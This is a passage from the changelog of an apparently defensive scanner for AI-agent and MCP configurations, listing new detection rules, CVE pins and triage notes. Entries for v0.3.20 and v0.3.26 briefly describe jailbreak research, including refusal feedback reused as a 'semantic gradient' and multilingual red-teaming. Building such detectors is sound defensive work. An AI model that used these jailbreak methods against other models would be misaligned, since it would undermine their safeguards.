### Notes

- No version bump in this changeset. Release cadence + tag/PyPI/GHCR/
  Sigstore is intentionally a separate flow.
- The MCP Tunnels feature is in *research preview*. Anthropic's docs
  state: *"They are provided 'as-is' without any uptime, support, or
  continuity commitment, and they depend on a third-party network
  provider (Cloudflare) that makes no availability commitment for the
  underlying transport. Anthropic may modify or discontinue MCP
  tunnels at any time."* The rule pack will need a refresh whenever
  the proxy config schema changes upstream.

## [0.3.27] - 2026-05-28

**Headline: New advisory rule `AAK-MCP-ATTEST-001` — flags MCP server
entries in the agent/host config that are dispatched without any of: a
referenced signed clearance assertion, a `/.well-known/mcp-clearance`
(or configured) URI, or a pinned trust root. Surfaces the
deny-by-default server-admission gap from Metere 2026 (arXiv:2605.24248,
"Attested Tool-Server Admission") as a static finding so MCP hosts can
adopt the proposed addendum incrementally — an unattested config keeps
working but is now visible in SARIF, the OWASP MCP Top 10 mapping
(MCP07:2025), and the EU AI Act Art. 15 / SOC 2 compliance surface
(via ASI03 + ASI04).**

Citations:

- Metere 2026, "Attested Tool-Server Admission: A Security Extension to
  the Model Context Protocol", **arXiv:2605.24248** — small,
  offline-signed clearance assertion at a well-known URI, pinned trust
  root verification before tool dispatch, deny-by-default per-server
  tool allowlist, flavor-gated enforcement mode, RFC-2119 normative
  schema + machine-checkable conformance vectors. An unextended host
  ignores the well-known document and behaves exactly as today, so the
  static evidence we look for is the host's *opt-in*:
  per-server attestation field, `MCP-Clearance` header, named
  `.well-known/mcp-clearance` URI, or host-level pinned `trust_root`.

### Added

- **`AAK-MCP-ATTEST-001`** *(MCP Configuration; advisory / medium)* —
  fires once per dispatched-but-unattested MCP server entry. Suppressed
  by any one of:
  - Per-server `attestation` / `clearance` / `clearance_url` /
    `clearance_uri` / `clearance_document` / `mcp_clearance` field, or
    aliased per-server `trust_root` / `trust_anchor` /
    `pinned_trust_root`.
  - An `MCP-Clearance` / `MCP-Attestation` / `X-MCP-Clearance` header
    on the server entry (transport-level carrier).
  - The well-known URI `.well-known/mcp-clearance` named anywhere in
    the server entry.
  - A host-level pinned `trust_root` / `trust_anchor` /
    `trusted_roots` / `mcp_clearance_trust_root` /
    `attestation_trust_root` (one pin covers every server in the file).
  - Stub server entries without `url` or `command` are skipped (other
    rules already catch those).
- SARIF: emitted with `security-severity` and
  `primaryLocationFingerprint`, consistent with sibling `AAK-MCP-*`
  rules. Listed in the OWASP MCP Top 10 cross-reference under
  **MCP07:2025**.
- Compliance: lands under EU AI Act **Article 15** (Robustness &
  Security), SOC 2 **CC6.1 / CC6.3 / CC6.7**, ISO 27001 **A.8.24 /
  A.5.23**, HIPAA **164.312(d)** automatically via the
  `ASI03` + `ASI04` OWASP-Agentic mapping, with no `compliance.py`
  schema change.

### Changed

- `tests/fixtures/clean_mcp.json` — added a host-level `trust_root` so
  the long-standing "clean MCP config produces zero findings"
  invariant survives `AAK-MCP-ATTEST-001`'s introduction.
- README: per-category description for *MCP Configuration* extends
  with the deny-by-default attested-admission item; `<!-- rule-count
  -->` anchors auto-sync to **212** rules, MCP Configuration category
  count to **44**.

## [0.3.26] - 2026-05-26

**Headline: New advisory rule `AAK-EU-AI-ACT-ART15-LOCALE-001` — flags
multilingual user-facing agent configs that lack per-locale eval / test
coverage, surfacing the gap as auditor-ready evidence under EU AI Act
Article 15 (Accuracy, Robustness & Cybersecurity). The `eu-ai-act`
compliance report grows a dedicated *Article 15 — Accuracy, Robustness
& Cybersecurity (evidence)* subsection beneath the existing Art. 15
PASS/FAIL row, with two stable line items: `multilingual-locale-declared`
and `multilingual-eval-coverage`.**

Citations:

- Regulation (EU) 2024/1689 — high-risk-system provisions become binding
  **2026-08-02**. Article 15: "high-risk AI systems shall be designed
  and developed in such a way that they achieve an appropriate level of
  accuracy, robustness and cybersecurity, and that they perform
  consistently in those respects throughout their lifecycle."
  <https://artificialintelligenceact.eu/article/15/>
- Ford et al. 2026, "Same Model, Different Weakness: How Language and
  Modality Reshape the Jailbreak Attack Surface in Frontier MLLMs",
  arXiv:**2605.23157** — 363-prompt red-team across 4 frontier MLLMs in
  US English and Mexican Spanish; safety rankings invert between
  languages and "treating language and modality as independent
  dimensions in safety frameworks misses critical vulnerabilities in
  globally deployed systems". This is the empirical motivation for
  tracking per-locale eval coverage as Art. 15 evidence.
  <https://arxiv.org/abs/2605.23157>

### Added — Legal Compliance

- **`AAK-EU-AI-ACT-ART15-LOCALE-001`** (INFO / advisory,
  Category.LEGAL_COMPLIANCE) — fires when all hold: (1) a repo agent /
  safety / eval config (`agent.yaml`, `agents.yaml`, `crew.yaml`,
  `manifest.yaml`, `safety.yaml`, `eval.yaml`, …) declares ≥ 2 locales
  via `locales:` / `languages:` / `supported_languages:` / individual
  `locale:` keys (ISO-639-1 with optional BCP-47 region suffix
  collapsed); (2) the same config marks the agent user-facing —
  explicit `user_facing: true`, `surface:` containing
  `end-user`/`user-facing`/`public`, or role string in
  `{assistant, chatbot, support, agent, concierge, helper, advisor,
  tutor, companion}`; (3) the union of locale codes derived from
  `evals/`, `eval/`, `evaluation/`, `evaluations/`, `fixtures/`,
  `scenarios/`, `i18n/`, `locales/`, `test_data/`, `testdata/`, or
  `benchmarks/` paths covers fewer than two of the declared locales.
  The rule **carries no OWASP-Agentic ASI tag** — it surfaces through
  the dedicated `compliance.py` Art. 15 evidence subsection rather than
  the ASI-driven PASS/FAIL summary, so a single coverage gap does not
  flip the Art. 15 control to FAIL.

- **`agent_audit_kit/scanners/eu_ai_act_art15_locale.py`** — new
  scanner module wired into `_OPTIONAL_SCANNERS`. 12-case test matrix
  in `tests/test_eu_ai_act_art15_locale.py`: rule registration shape,
  scanner-engine wiring, positive (multilingual + en-only eval),
  negative (multilingual + multi-locale eval coverage, single-locale
  agent, internal/non-user-facing multilingual agent, no-config repo),
  documented-risk opt-out, report subsection renders both with and
  without findings, advisory finding does NOT flip the Art. 15 control
  to FAIL, subsection appears only under `--compliance eu-ai-act`.

### Changed — Compliance report

- `agent_audit_kit/output/compliance.py` — the eu-ai-act framework now
  emits an *Article 15 — Accuracy, Robustness & Cybersecurity
  (evidence)* sub-block under its Art. 15 control row only. Default
  lines on a clean scan:

  ```
  Article 15 — Accuracy, Robustness & Cybersecurity (evidence)
    multilingual-locale-declared: n/a (no multilingual user-facing agent config detected)
    multilingual-eval-coverage: evidenced or not applicable (no Art. 15 locale-coverage finding)
  ```

  On a positive finding:

  ```
  Article 15 — Accuracy, Robustness & Cybersecurity (evidence)
    multilingual-locale-declared: 3 locale(s) (de, en, fr)
    multilingual-eval-coverage: not evidenced — covered=[en], 1 finding(s) (AAK-EU-AI-ACT-ART15-LOCALE-001)
  ```

  Other frameworks (`soc2`, `iso27001`, `hipaa`, `nist-ai-rmf`,
  `mcp-2026-roadmap`) are unchanged — the subsection is keyed on
  `framework_key == "eu-ai-act"` and the control label starting with
  `Art. 15`.

### Suppression

- New `.agent-audit-kit.yml` opt-out key:
  ```yaml
  accepts_locale_coverage_gap: true
  justification: "describe why per-locale eval is intentionally absent"
  ```
  Suppresses `AAK-EU-AI-ACT-ART15-LOCALE-001` for projects whose
  per-locale eval lives outside the scanned tree.

### Changed — Counts

- Bundle ships 211 rules (was 210); LEGAL_COMPLIANCE category row in
  README "What It Scans" goes 11 → 12 via the per-category anchor.
  Scanner count 67 → 68. Shields.io badge auto-rewritten by
  `sync_rule_count.py` / `sync_scanner_count.py`.

## [0.3.25] - 2026-05-25

**Headline: New rule family `AAK-MCP-STATELESS-001..004` — flags MCP
server / client code that assumes the pre-2026-07-28 stateful protocol.
The 2026-07-28 spec release candidate (locked 2026-05-21) makes the
protocol stateless by default: the `Mcp-Session-Id` header and the
protocol-level session are removed (SEP-1442), and the experimental
`tasks/list` method is removed because it can't be scoped safely without
sessions (SEP-1359). Code relying on the pre-RC shape will silently
break once the final spec lands on 2026-07-28.**

Sources:

- <https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/>
- <https://blog.modelcontextprotocol.io/posts/2025-12-19-mcp-transport-future/>
- <https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1442> — SEP-1442 (stateless by default)
- <https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1359> — SEP-1359 (protocol-level sessions removed)

### Added — MCP Configuration

- **`AAK-MCP-STATELESS-001`** (HIGH) — fires when source code under a
  declared MCP SDK reads, writes, or constants the `Mcp-Session-Id`
  header (or the snake-case Python variant `MCP_SESSION_ID`). After the
  2026-07-28 cutover the header and the session it represented are
  gone; any request can land on any server instance, so sticky routing
  + shared session stores at the protocol layer are no longer
  guaranteed. Fix hint: route on the new `Mcp-Method` header, persist
  per-server state behind an out-of-band identity (auth subject, OAuth
  `sub`, tool argument). Maps to OWASP MCP07:2025, ASI03, AICM IAM-01 /
  AIS-08.
- **`AAK-MCP-STATELESS-002`** (HIGH) — fires when code dispatches or
  handles the removed `tasks/list` JSON-RPC method (`"tasks/list"`
  literal, `tasks.list(...)` / `tasks_list(...)` SDK alias). Tasks moves
  out of the core specification into the new Extensions framework; the
  stateful list surface has no stateless successor. Maps to OWASP
  MCP07:2025, AICM AIS-07 / AIS-08.
- **`AAK-MCP-STATELESS-003`** (MEDIUM) — fires on infrastructure
  manifests that require sticky routing for an MCP backend (nginx
  `ip_hash` / `sticky`, Kubernetes `sessionAffinity: ClientIP`, Traefik
  / ALB sticky cookies) OR on handler code that reads a shared session
  store keyed on a per-connection id used across requests
  (`session_store[session_id]` and friends). Infra-side findings fire
  when either the project declares an MCP SDK or the manifest itself
  mentions MCP; code-side findings are gated on the SDK. Maps to
  OWASP MCP07:2025, AICM IVS-04 / BCR-04.
- **`AAK-MCP-STATELESS-004`** (LOW, advisory) — fires when a client
  file calls `tools/list` / `list_tools` at least twice in the same
  file with no caching marker nearby (`lru_cache`, `TTLCache`,
  `cached_property`, `cachetools`, `tools_list_cache`, `cached_tools`,
  `memoize`, `functools.cache`, `ttlMs` / `ttl_ms` / `ttlSeconds`) AND
  the file references per-session state. Stateless transport may serve
  a different instance per request — un-cached repeated discovery
  multiplies round-trips and may surface a different tool catalog each
  time. Maps to OWASP MCP07:2025, AICM AIS-07.

- **`agent_audit_kit/scanners/mcp_stateless_migration.py`** — new
  scanner module wired into the `_OPTIONAL_SCANNERS` registry. Reuses
  the `_declares_sdk` predicate pattern from `mcp_sampling_capability`.
  16-case test matrix in `tests/test_mcp_stateless_migration.py`:
  positive + negative for each sub-detector, plus the cross-cutting
  `.agent-audit-kit.yml accepts_stateless_migration_risk: true`
  opt-out, a clean stateless-server fixture, an OWASP-mapping
  assertion, and an engine-wiring guard.

### Changed — Counts

- Bundle ships 210 rules (was 206). `MCP_CONFIG` category row in
  README "What It Scans" goes 39 → 43 via the per-category anchor;
  shields.io badge auto-rewritten by `sync_rule_count.py`.

### Suppression

- New `.agent-audit-kit.yml` opt-out key:
  ```yaml
  accepts_stateless_migration_risk: true
  justification: "describe why your project intentionally lives on the pre-2026-07-28 stateful transport"
  ```
  Suppresses every `AAK-MCP-STATELESS-*` finding for projects that are
  knowingly retiring before the cutover.

## [0.3.24] - 2026-05-23

**Headline: New rule `AAK-MCP-SAMPLING-001` — flags MCP servers / clients
that wire up the `sampling` capability (MCP 2025-06-18 §6.3) without an
`elicitation/create` consent prompt or human-approval flag.**

### Added — MCP Configuration

- **`AAK-MCP-SAMPLING-001`** (HIGH, Category.MCP_CONFIG) — fires when ALL
  hold: (1) a manifest declares an MCP SDK (Python / TS / Java / Rust),
  (2) a repo file participates in the `sampling` capability (declares
  `capabilities.sampling`, calls `sampling/createMessage` /
  `create_message`, installs a `CreateMessageRequestSchema` handler, or
  imports `SamplingCapability`), (3) no consent / elicitation marker is
  present (`elicitation/create`, `ElicitRequestSchema`, `elicit_*`,
  `requires_consent`, `human_in_the_loop`, `confirmSampling`, etc.),
  (4) `.agent-audit-kit.yml` does NOT carry
  `accepts_sampling_risk: true` with a non-empty `justification:`. Also
  fires when an MCP config file (`.mcp.json` family) lists `"sampling"`
  in a per-server `capabilities` block without a sibling
  `requires_consent` / `human_in_the_loop` flag (catches host-side
  allow-listing). Maps to OWASP MCP07:2025 + MCP02:2025, ASI03, AICM
  IAM-01 / AIS-07.

- **`agent_audit_kit/scanners/mcp_sampling_capability.py`** — new
  scanner module wired into the `_OPTIONAL_SCANNERS` registry. Reuses
  the `_declares_sdk` predicate pattern from `mcp_sdk_hardening.py`.
  10-case test matrix in `tests/test_mcp_sampling_capability.py`:
  Python/TS vulnerable, Python elicit-gated, documented-risk opt-out,
  `.mcp.json` declared / `requires_consent` gated, SDK-absent silence,
  SDK-present-sampling-absent silence, prose-mention silence, and
  OWASP-mapping assertion.

### Changed — Counts

- Bundle ships 206 rules (was 205). `MCP_CONFIG` category row in
  README "What It Scans" goes 38 → 39 via the per-category anchor;
  shields.io badge auto-rewritten by `sync_rule_count.py`.

## [0.3.23] - 2026-05-20

**Headline: README per-category anchor sync — closes the 81-rule
undercount the "What It Scans" table was carrying against the live
registry (no rule changes; docs + sync-script + regression test).**

### Fixed — Documentation drift (docs-only)

- **README "What It Scans" table** — at v0.3.22 ship the table summed
  to **124 rules** vs the registry's 205 (badge + `RULE_COUNT` were
  correct; only the per-category cells drifted). Every category cell
  was undercount; Supply Chain alone was off by +28. Each of the 11
  category rows now carries an HTML anchor in the form
  `<!-- category-count:CATEGORY_NAME -->NN<!-- /category-count -->`
  (matching the live `Category` enum name verbatim), and the prose
  has been refreshed to mention every rule shipped through this week
  (Tasks-primitive leakage, OAuth 2.1 DPoP, OX MCP-STDIO command
  injection, `apache-doris-mcp-server`, `excel-mcp-server`, MCP
  Calculate Server, Project Deal economic-drift, Metis POMDP,
  SkillsVote attribution, Code-as-Harness, MCP Inspector vendored
  fork, DNS-rebinding, transport-flip MITM, etc.).

### Added — Tooling

- **`scripts/sync_rule_count.py`** now also rewrites every
  `<!-- category-count:NAME -->NN<!-- /category-count -->` anchor in
  README in lockstep with the registry, and exits 1 with a typo guard
  if the README references a `Category` enum name the registry does
  not have. Regex character class is `[A-Z0-9_]+` so `A2A_PROTOCOL`
  matches (the digit was load-bearing — the regression test below
  caught a silent skip).

- **`tests/test_repo_metadata_sync.py::test_readme_per_category_anchors_match_registry`** —
  new regression test that locks every per-category anchor to
  `Counter(r.category.name for r in RULES.values())` and asserts the
  sum matches the live total. Future drift will fail CI rather than
  ship undetected.

### Why this is a separate release

The v0.3.22 release notes already shipped — the table drift is
docs-only, but it materially understates how much surface the
scanner covers (124 vs 205). Re-tagging today fixes the public
README without rewriting v0.3.22 history.

---

## [0.3.22] - 2026-05-20

**Headline: 2 new research-grade MEDIUM rules (205 total) anchored
to two arXiv papers verified 2026-05-18 — SkillsVote lifecycle
attribution + Code-as-Harness multi-agent shared-state.**

### Added — Rules (2, research-grade)

- **AAK-SKILL-LIFECYCLE-ATTRIBUTION-001** (MEDIUM) — Python AST
  detector for `@skill` / `@register_skill` / etc. decorated
  functions (or `execute` / `run_skill` / `invoke_skill` functions
  in a `skill` / `skills` / `agent-skills` directory) that mutate
  persistent state (file write, DB commit, side-effecting HTTP
  verb) without emitting an outcome-attribution call
  (`record_outcome` / `log_outcome` / `attribute_*` / etc.). Per
  *SkillsVote: Lifecycle Governance of Agent Skills* (Liu et al.,
  arXiv:2605.18401, 2026-05-18), the evidence-gated update loop
  depends on per-execution attribution; missing attribution
  silently degrades repeat invocations.

  New scanner: `agent_audit_kit/scanners/skill_lifecycle_attribution.py`.

- **AAK-AGENT-HARNESS-SHARED-STATE-001** (MEDIUM) — Python AST
  detector for module-level mutable objects (`dict` / `list` /
  `set`) mutated by methods of ≥2 distinct Agent / Worker /
  Harness classes without a lock primitive (`threading.Lock` /
  `asyncio.Lock` / etc.) visible in any of the mutating function
  bodies. Per *Code as Agent Harness* (Ning et al.,
  arXiv:2605.18747, 2026-05-18 — survey of 110+ papers + 23
  systems), "consistent shared state across multiple agents" is
  named as an explicit open challenge for harness engineering.

  New scanner: `agent_audit_kit/scanners/agent_harness_shared_state.py`.

**Both rules MEDIUM (research-grade tier)** because the source
papers identify the failure shape but do not prescribe specific
code patterns. Rules catch the most concrete extrapolations:
attribution-call presence (SkillsVote) and lock-hint presence
(Code-as-Harness). False positives are expected when projects use
project-local naming for outcome records or external coordinators
(database transaction, message queue) for serialization.

### Declined — invented YAML schemas

The 2026-05-20 daily prompt proposed `requires_search: true` and
`depends_on` YAML frontmatter checks anchored to SkillsVote. **Both
field names are invented** — the paper does not define them.
Declined to ship; tracking issue can be filed if a future paper
prescribes an actual schema.

### Triage closures (no rule shipped)

- **#272 CVE-2026-2611** (MLflow 3.9.0 `/ajax-api` origin-validation
  bypass) — class-covered by `AAK-TRUST-001..005` (origin / CORS /
  allowlist) + `AAK-OAUTH-001..005`. Named pin-floor on `mlflow<3.9.1`
  is a v0.3.23+ candidate if a fresh CVE warrants.

### Tests

- 6 new tests in `tests/test_v0_3_22_rules.py`: 3 SkillsVote
  (unsafe fires, safe with `record_outcome` passes, no-decorator-
  outside-skills-path passes); 3 Code-as-Harness (unsafe multi-
  agent fires, safe-with-lock passes, single-agent-no-fire). Total
  **980 passing** (was 974 at v0.3.21 baseline, +6).

### Two scanner bugs caught + fixed pre-commit

- Skill scanner path-detection was too permissive (any-substring
  match on "skill" → false-positive on pytest tmp_path directories
  named `test_skill_*`). Tightened to exact-segment match against
  `{skill, skills, agent-skills, .skills, skill-pack}`.
- Harness scanner missed `ast.AnnAssign` form (`_SHARED: dict = {}`)
  — only walked `ast.Assign`. Added AnnAssign handling so typed-
  annotation module-level mutables are detected.
- Harness lock-hint matching was case-sensitive (`_LOCK` ≠ `_lock`
  hint). Switched to case-insensitive comparison.

### Deferred

- Microsoft AGT exporter (#267) — still pending schema verification.
- Metis rules 3-5 — still pending defensive-side follow-up paper.

## [0.3.21] - 2026-05-19

**Headline: 1 new INFO rule (203 total) — Stainless-generator
provenance detector anchored to the 2026-05-18 Anthropic acquisition
announcement.**

### Added — Rule (1, provenance / INFO)

- **AAK-MCP-LINEAGE-STAINLESS-001** (INFO) — Two-arm detector for
  Stainless-generated source trees:
  - **Banner arm**: matches `File generated from our OpenAPI spec
    by Stainless.` (verified verbatim against
    github.com/anthropics/anthropic-sdk-python on 2026-05-19) or
    `Code generated by Stainless` in `.py` / `.ts` / `.tsx` / `.js` /
    `.mjs` / `.cjs` / `.go` / `.java` / `.kt` / `.rb` / `.cs` /
    `.php` source files (first 8 lines only; capped at 200 fires
    per scan to bound runtime).
  - **Config arm**: fires on `stainless.yml` / `stainless.yaml` /
    `stainless.config.json` / `.stainless.yml` / `.stainless.yaml`
    at project root, or a `.stainless/` / `stainless/` config
    directory.

  **Provenance, not vulnerability** — severity INFO. Anchor:
  [Anthropic acquires Stainless](https://www.anthropic.com/news/anthropic-acquires-stainless)
  (2026-05-18). The announcement makes **no** claim of bifurcated
  pre-vs-post-acquisition default-posture, and AAK does not invent
  one. The rule surfaces generator lineage so procurement teams and
  SBOM tooling can answer "which of our MCP servers / SDKs are
  generator-produced." If a future CVE targets a specific Stainless
  version, this rule will be re-targeted.

  New scanner module: `agent_audit_kit/scanners/stainless_lineage.py`.

### Triage closures (no rule shipped)

- **#269 CVE-2026-47090** (MEDIUM, Claude HUD OSC 8 hyperlink
  injection) + **#270 CVE-2026-47092** (HIGH, Claude HUD `COMSPEC`
  command injection) — closed with honest triage: Claude HUD has
  **no public npm/PyPI surface**, so a pin-floor SAST rule has no
  manifest to match against. Runtime architectural shapes ARE
  class-covered (AAK-LOG-INJECTION-001 family for OSC 8 escapes;
  AAK-MCP-STDIO-CMD-INJ-001..004 + AAK-STDIO-001 for the env-var-
  controlled subprocess shape). If a published Claude HUD package
  surfaces in the future, a named pin rule lands then.

### Tests

- 6 new tests in `tests/test_v0_3_21_rules.py`: Python banner fires,
  TypeScript banner fires, hand-written source passes, `stainless.yml`
  config fires, empty project passes, banner+config fires both arms.
- Total **974 passing** (was 968 at v0.3.20 baseline, +6).

### Watcher dedup follow-up (v0.3.20 #163 fix)

The watcher dedup fix shipped in v0.3.20 held overnight — the 2
sla-48h tickets that fired today (#269, #270) were **genuinely new
CVE IDs**, not re-fires of yesterday's batch. The 28-ticket daily
re-fire pattern observed 2026-05-13 → 2026-05-18 is structurally
extinct.

### Deferred

- Metis rules 3-5 (closed-loop, self-evolving prompt mutation, etc.)
  — still pending a defensive-side follow-up paper.
- Microsoft AGT exporter (#267) — still pending schema verification
  from `microsoft/agent-governance-toolkit` source tree.

## [0.3.20] - 2026-05-18

**Headline: 2 new research-grade rules (202 total) — Metis POMDP
closed-loop reasoning detectors anchored to arXiv:2605.10067 (ICML
2026) — plus the cve-watcher dedup fix (#163) ending 5+ days of
daily ticket re-fires.**

### Fixed — cve-watcher daily-re-fire bug (#163)

The `scripts/cve_watcher.py` `_open_issue_cves` helper only checked
`state=open&labels=cve-response`, so a CVE closed with a class-
coverage citation was forgotten and re-filed on the next watcher
cycle. Renamed to `_all_issue_cves` and changed to `state=all` with
pagination (hard cap at 20 pages = 2000 issues). Back-compat alias
preserved. Regression test in `tests/test_cve_watcher_dedup.py`:
`test_closed_issue_title_suppresses` explicitly asserts a previously-
closed CVE ID is not re-filed.

Impact: ends the 28-ticket daily re-fire pattern observed across
2026-05-13 → 2026-05-18.

### Added — Rules (2, research-grade)

- **AAK-METIS-REFUSAL-REFEED-001** (MEDIUM) — Python AST detector
  for a function that consumes an LLM-refusal signal and either
  returns it or passes it to a prompt-sink call (`format` /
  `append` / `add_message` / `build_prompt` / etc.) without
  policy-mediated transformation. Per Metis (arXiv:2605.10067),
  structured refusal feedback used as a semantic gradient is the
  exploited surface.
- **AAK-METIS-SCORING-SINK-001** (MEDIUM) — same shape applied to
  scoring / judge / reward / critique signals.

**Research-grade tier:** both rules are MEDIUM (not HIGH/CRITICAL)
because the Metis paper is an offensive jailbreak paper, not a
defensive SAST prescription — the proposed rules catch code shapes
the paper shows are exploitable, but don't prove RCE on any specific
tool call. Treat as code-review prompts, not automatic blockers.

New scanner module: `agent_audit_kit/scanners/metis_pomdp.py`.

### Deferred — Suggestion 2 (Microsoft AGT exporter)

The Microsoft Agent Governance Toolkit evidence-JSON exporter was
proposed in today's daily prompt. **Declined for v0.3.20** because
the actual evidence-JSON schema is NOT documented in the MS repo's
README — building today would mean guessing the schema. Tracking
issue [#267](https://github.com/sattyamjjain/agent-audit-kit/issues/267)
queues the work for v0.3.21+ pending schema verification.

### Deferred — Metis rules 3-5

The 2026-05-18 prompt proposed 5 Metis rules. Three were deferred:
"self-evolving prompt mutation without rate-limit", "structured-
feedback echoing into system prompt", "closed-loop reasoning chain
without circuit-breaker." Each needs more concrete code-shape
specification than the Metis paper itself provides (it's an
offensive paper). Will revisit when a defensive-side follow-up
paper or empirical study lands.

### Tests

- 4 new tests in `tests/test_v0_3_20_rules.py` (Metis: 3 positive,
  1 early-exit-clean).
- 1 new regression test in `tests/test_cve_watcher_dedup.py`
  (`test_closed_issue_title_suppresses` — direct guard against #163).
- Total **968 passing** (was 963 at v0.3.19 baseline, +5).

### Triage (no code change)

- 2 sla-48h tickets closed earlier today (#265 + #266) — class-
  covered re-fires. **These would have been auto-suppressed by the
  v0.3.20 watcher fix** had it shipped yesterday — they were the
  last re-fires before the fix lands.

## [0.3.19] - 2026-05-17

**Headline: 4 new rules (200 total) — source-side generalization of
yesterday's CVE-2026-44717 pin + new MCP-OPENAPI smell category
anchored to Hermes paper (arXiv:2605.14312, EASE 2026).**

Third release today, on top of v0.3.17 (orphan recovery) and v0.3.18
(MCP Calc CVE-2026-44717 pin). This release ships the
complementary source-side detector that v0.3.18's CHANGELOG
explicitly queued.

### Added — Rule 1 of 4: source-side @mcp.tool unsafe eval

- **AAK-MCP-TOOL-UNSAFE-EVAL-001** (CRITICAL) — AST detector that
  fires on any Python function decorated with `@mcp.tool` /
  `@server.tool` / `@app.tool` / `@fastmcp.tool` / `@tool` whose
  body contains an `eval()` / `exec()` / `compile()` / `__import__()`
  / unsafe `parse_expr()` call with an argument bound to the
  function's parameter set. Generalizes v0.3.18's named-product
  pin `AAK-MCPCALC-CVE-2026-44717-PIN-001` to the architectural
  class. New scanner module
  `agent_audit_kit/scanners/mcp_tool_unsafe_eval.py`.

### Added — Rules 2/3/4 of 4: MCP-OPENAPI smell category (Hermes)

- **AAK-MCP-OPENAPI-LAZY-DESCRIPTION-001** (MEDIUM) — operation
  with missing or sub-40-character `description`.
- **AAK-MCP-OPENAPI-BLOATED-PARAMS-001** (LOW) — operation with
  >12 parameters or >24 requestBody properties.
- **AAK-MCP-OPENAPI-TANGLED-METHODS-001** (MEDIUM) — path with >4
  HTTP methods OR method-name vs. path-segment verb contradiction
  (POST /get/..., GET /create/..., etc.).

  Per Hermes (arXiv:2605.14312, EASE 2026 — 2,450 smells across 600
  endpoints) these are the three primary failure shapes that break
  agent tool-selection accuracy when an OpenAPI 3.x spec is
  auto-converted to MCP tools.

  New scanner module `agent_audit_kit/scanners/openapi_smells.py`.
  Auto-detects `openapi.{yaml,yml,json}` / `swagger.{yaml,yml,json}` /
  `*.openapi.*` at project root or in `api/` / `openapi/` / `spec/` /
  `docs/api/` subdirs. Skips files that don't parse as YAML/JSON
  with a top-level `openapi:` or `swagger:` field.

### Declined — Suggestion 2 from 2026-05-17 daily prompt

The proposed `AAK-MCP-067` for CVE-2026-33032 (nginx-ui) is a
verified duplicate. CVE-2026-33032 is already covered by multiple
rules in `agent_audit_kit/rules/builtin.py` including the `AAK-MCPwn-*`
middleware-asymmetry family. The doc's proposed rule also
misdescribes the CVE pattern — NVD says the bypass is an
unauthenticated `/mcp_message` endpoint paired with an authed
`/mcp` endpoint, not 0.0.0.0 binding without auth. Decline.

### Tests

- 7 new tests in `tests/test_v0_3_19_rules.py` — 3 for the eval AST
  detector (positive eval+exec, safe ast.literal_eval, no-decorator
  passes); 4 for OpenAPI smells (smelly fires all 3, clean passes,
  no-spec passes, verb-method-conflict isolation).
- Total **963 passing** (was 956 at v0.3.18 baseline, +7).

### Triage (no code change)

- 2 sla-48h tickets closed earlier today (#262 + #263) — class-
  covered by AAK-OAUTH-* + AAK-SSRF-* family.

### Deferred

- Watcher dedup fix (#163) — v0.3.20.
- PraisonAI CRITICAL pin pair (CVE-2026-41497 + CVE-2026-44336) —
  v0.3.20.

## [0.3.18] - 2026-05-17

**Headline: 1 new CRITICAL rule (196 total) — MCP Calculate Server
pin for CVE-2026-44717 (CVSS 9.8, NVD 2026-05-15).** Ships within
the 48h CVE-to-rule SLA window.

### Added — Rule (1)

- **AAK-MCPCALC-CVE-2026-44717-PIN-001** (CRITICAL, CVE-2026-44717,
  CVSS 9.8) — PyPI `mcp-calculate-server` <0.1.1 routes MCP tool
  input through `eval()` (SymPy-backed, no `local_dict`/`global_dict`
  pinning), reaching host RCE from any attacker-controlled tool
  argument. Pin-arm fires on the package in any Python manifest
  (`requirements*.txt`, `pyproject.toml`, `Pipfile*`, `poetry.lock`,
  `uv.lock`). Patched upstream in 0.1.1 (latest at ship: 1.0.0).

### Tests

- 4 new tests (`tests/test_v0_3_18_rules.py`): vulnerable pin fires
  CRITICAL, exact-patched pin passes, floor pin passes, no-dep
  passes.

### Triage (no code change)

- 28 sla-48h tickets closed across 2026-05-16 + 2026-05-17 batches
  (#232–#260) — class-coverage citations against AAK-STDIO-001 +
  AAK-MCP-STDIO-CMD-INJ family, AAK-OAUTH-*, AAK-SSRF-* family,
  AAK-GHA-IMMUTABLE-001. Watcher dedup (#163) is the underlying
  bug causing the daily re-fire pattern.
- #253 (CVE-2026-44717 itself) closed by ship.

### Process notes

- v0.3.17 (Semantic Kernel CVE-2026-26030) was an orphan release
  from 2026-05-10 — code on `main` since then but the release tag
  was blocked at the CVE-gate by accumulated sla-48h backlog. Tag
  pushed and full release pipeline ran green on 2026-05-17. PyPI
  + GitHub Release + GHCR + Sigstore SBOM all live for both
  v0.3.17 and v0.3.18.

### Deferred

- Source-detector for unsafe-`eval()` inside `@mcp.tool` handlers
  (would generalize the named pin rule to any MCP server with the
  same shape) — v0.3.19 candidate.
- Watcher dedup fix (#163) — v0.3.19. Closed-issue lookup needs to
  participate in the cve-watcher's diff so the same CVE ID doesn't
  re-fire daily.
- PraisonAI CRITICALs (CVE-2026-41497 + CVE-2026-44336) — v0.3.19+.

## [0.3.17] - 2026-05-10

**Headline: 1 new CRITICAL rule (195 total) — Microsoft Semantic Kernel
Python SDK pin-floor for CVE-2026-26030 (CVSS 9.9, MSRC 2026-05-07).**

This release ships within 72 hours of the MSRC disclosure (within
the 48h SLA for the actionable Python arm). The companion .NET CVE
(CVE-2026-25592, file-write in SessionsPythonPlugin) is out of scope
— AAK doesn't currently scan NuGet manifests.

### Added — Rule (1)

- **AAK-SK-INMEMORY-VECTORSTORE-FILTER-CVE-2026-26030-PIN-001**
  (CRITICAL, CVE-2026-26030, CVSS 9.9) — Microsoft Semantic Kernel
  Python SDK <1.39.4 RCE in `InMemoryVectorStore` filter
  functionality. Pin-arm only. Fires on `semantic-kernel` < 1.39.4
  in any Python manifest (`requirements*.txt` / `pyproject.toml` /
  `Pipfile*` / `poetry.lock` / `uv.lock`). Patched upstream in
  `python-1.39.4`.

### Changed

- `CHANGELOG.cves.md` ledger appends MSRC-2026-05-07 row + the
  CVE-2026-26030 entry.

### Tests

- 4 new tests in `tests/test_v0_3_17_rules.py` (vulnerable pin fires
  CRITICAL, exact-patched pin passes, floor pin passes, no-dep
  passes). Total 952 passing (was 948).

### Triage (no code change)

- 8 dup CVE-bot tickets closed (#207, #208, #211–#214 class-coverage
  re-fires; #209 + #210 PraisonAI re-fires deferred to v0.3.18 with
  rule-names already pre-allocated yesterday).

### Deferred

- CVE-2026-25592 (.NET SDK SessionsPythonPlugin file-write,
